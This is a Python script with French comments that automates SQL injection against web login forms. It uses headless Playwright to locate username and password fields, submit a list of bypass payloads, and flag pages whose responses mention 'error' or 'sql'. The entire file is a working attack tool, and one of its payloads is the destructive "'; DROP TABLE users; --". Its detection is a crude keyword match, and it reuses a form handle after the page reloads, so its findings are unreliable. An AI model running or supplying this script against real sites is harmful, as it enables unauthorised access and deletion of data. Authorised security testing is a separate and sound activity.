import asyncio
from playwright.async_api import async_playwright

async def sql_injection_attack(target_ip):
    async with async_playwright() as p:
        #lancer le navigateur en mode headless
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        #aller a l'url cible
        await page.goto(target_ip)
        
        
        #detection de formulaire
        forms = await page.query_selector_all("form")
        if not forms:
            print("Aucun formulaire trouvé sur la page")
            await browser.close()
            return "Aucun formulaire sur la page"

        print(f"{len(forms)} formulaire(s) trouvé(s). Test d'injection SQL...")
        
         # Liste de payloads SQL communs
        sql_payloads = [
            "' OR 1=1 --",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' OR 'a'='a",
        ]
        
        #parcourir les champs du formulaire trouvé 
        for form in forms:
            #recuperer les champs input
            inputs = await form.query_selector_all("input")
            login_field = None
            password_field = None
            
            #identifier les champs de texte et de password
            for input_tag in inputs:
                input_type = await input_tag.get_attribute("type")
                input_name = await input_tag.get_attribute("name")
                
                if input_type in ["text", "email"]:
                    login_field = input_name
                elif input_type == "password":
                    password_field = input_name
            
            #des que les champs login et password sont identifiés
            if login_field and password_field:
                print(f"Champs trouvés : {login_field} et {password_field}")
                
                for payload in sql_payloads:
                    #remplir les champs avec les payload injection sql
                    await page.fill(f"input[name='{login_field}']", payload)
                    await page.fill(f"input[name='{password_field}']", payload)
                    
                    #soummettre le formulaire
                    await form.evaluate("form => form.submit()")
                    
                    #attendre que la page charge
                    await page.wait_for_timeout(2000)
                    
                    #vérifier si l'injection a réussit
                    page_content = await page.content()
                    if "error" in page_content.lower() or "sql" in page_content.lower():
                        print(f"Vulnérabilité détectée avec le payload : {payload}")
                        await browser.close()
                        return f"Vulnérabilité détectée avec le payload : {payload}"
                
                print("Aucune vulnérabilité détectée pour ce formulaire.")
                
        await browser.close()